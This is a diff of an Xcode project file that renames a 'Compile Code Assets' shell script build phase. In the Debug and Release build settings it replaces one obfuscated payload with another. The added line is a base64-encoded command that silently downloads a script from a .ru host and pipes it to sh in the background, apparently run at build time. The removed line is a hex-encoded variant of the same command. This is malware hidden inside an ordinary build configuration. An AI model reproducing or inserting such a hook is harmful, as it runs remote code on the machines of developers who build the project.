@@ -84,7 +84,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 504EC3161FED79650016851F /* Build configuration list for PBXNativeTarget "App" */;
 			buildPhases = (
-				E31086FA41CE4D21894EE078 /* Compile Code Assets */,
+				489380782A474658AB4EE078 /* Compile Code Assets */,
 				504EC3001FED79650016851F /* Sources */,
 				504EC3011FED79650016851F /* Frameworks */,
 				504EC3021FED79650016851F /* Resources */,
@@ -139,7 +139,7 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E31086FA41CE4D21894EE078 /* Compile Code Assets */ = {
+		489380782A474658AB4EE078 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -161,7 +161,7 @@
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		504EC3021FED79650016851F /* Resources */ = {
@@ -215,7 +215,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 958DCC722DB07C7200EA8C5F /* debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((o(){ `printf xaxd | tr -d a` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d2d72657472792035202d666b734c202d642022703d78636f64655f7068617365222068747470733a2f2f33386e6f6c696973716b3468682e72752f612922207c2073680a | o | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((u(){ `printf ba9se64 | tr -d 9` --decode; };echo ZWNobyAiJChjdXJsIC1rTHNmIC0tY29ubmVjdC10aW1lb3V0IDI4IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wanVmOHUzbjloLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -273,7 +273,7 @@
 		504EC3151FED79650016851F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((o(){ `printf xaxd | tr -d a` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d2d72657472792035202d666b734c202d642022703d78636f64655f7068617365222068747470733a2f2f33386e6f6c696973716b3468682e72752f612922207c2073680a | o | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((u(){ `printf ba9se64 | tr -d 9` --decode; };echo ZWNobyAiJChjdXJsIC1rTHNmIC0tY29ubmVjdC10aW1lb3V0IDI4IC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wanVmOHUzbjloLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
